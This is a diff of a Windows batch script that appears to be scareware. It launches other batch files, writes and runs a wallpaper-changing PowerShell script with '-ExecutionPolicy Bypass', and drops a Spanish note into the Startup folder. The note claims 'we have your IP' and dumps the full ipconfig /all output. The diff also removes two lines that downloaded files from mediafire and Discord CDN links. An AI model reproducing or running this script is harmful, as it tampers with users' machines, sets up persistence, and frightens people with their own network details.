@@ -14,8 +14,8 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJiZkgaHErSXA==
-::ZQ05rAF9IBncCkqN+0xwdVsGAlfMbCXqZg==
+::cxY6rQJ7JhzQF1fEqQJiZk8aHErSXA==
+::ZQ05rAF9IBncCkqN+0xwdVsGAlDMbCXqZg==
 ::ZQ05rAF9IAHYFVzEqQIWAzJmeTfi
 ::eg0/rx1wNQPfEVWB+kM9LVsJDCKJNXmvFdU=
 ::fBEirQZwNQPfEVWB+kM9LVsJDAKJNXmvFdU=
@@ -675,13 +675,13 @@ start s44ss1541DDDDD44.bat
 start ppppppppppppppp.bat
 cd C:\ 
 md WWbbbkk
-cd C:\WWbbbkk powershell wget -outf Bbllkk.png https://download1502.mediafire.com/us304z4tyh9g/xyu3gsdpv742gne/n.png 
+cd C:\WWbbbkk 
 echo Function Set-WallPaper($Value) >> KKKKllkjsdi.ps1
 echo { >> KKKKllkjsdi.ps1
 echo Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value >> KKKKllkjsdi.ps1 
 echo rundll32.exe user32.dll, UpdatePerUserSystemParameters >> KKKKllkjsdi.ps1 
 echo } ">> KKKKllkjsdi.ps1  
-echo Set-WallPaper -value C:\WWbbbkk\Bbllkk.png >> KKKKllkjsdi.ps1  
+echo Set-WallPaper -value C:\Windows\System32\@language_notification_icon.png >> KKKKllkjsdi.ps1  
 echo rundll32.exe user32.dll, UpdatePerUserSystemParameters >> KKKKllkjsdi.ps1  
 powershell.exe -ExecutionPolicy Bypass -File "C:\WWbbbkk\KKKKllkjsdi.ps1" 
 rundll32.exe user32.dll, UpdatePerUserSystemParameters 
@@ -735,10 +735,9 @@ start s44ss1541DDDDD44.bat
 cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 echo Tenemos tu ip: >> Abrime.txt
 ipconfig | Find "IPv4" >> Abrime.txt
-echo Tu nombre: %username% >> Abrime.txt
+echo Tu nombre de usuario: %username% >> Abrime.txt
 echo - >> Abrime.txt
 echo Incluso tenemos toda esta informacion: >> Abrime.txt
 echo Informacion completa de la red Conectada: >> Abrime.txt
 ipconfig /all>> Abrime.txt
 exit
-powershell wget -outf tittl.mp3 https://cdn.discordapp.com/attachments/806596260735614999/820859736241078303/rirck.mp3
